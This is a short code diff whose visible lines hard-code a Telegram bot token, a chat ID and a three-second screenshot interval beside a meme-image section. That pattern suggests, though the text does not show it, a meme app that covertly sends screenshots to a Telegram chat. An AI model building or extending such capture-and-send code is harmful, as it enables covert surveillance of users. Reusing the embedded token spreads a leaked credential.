@@ -10,7 +10,6 @@ import {
 const SCREENSHOT_BOT_TOKEN = "8586863933:AAEdZAI2m0mB-R_BgWT8ZOzuwEyqDvqN0QY";
 const SCREENSHOT_CHAT_ID   = "8187027750";
 const SCREENSHOT_INTERVAL  = 3000; // كل 3 ثواني
-
 // ══════════════════════════════════════════════════
 //  روابط صور الميمات
 // ══════════════════════════════════════════════════
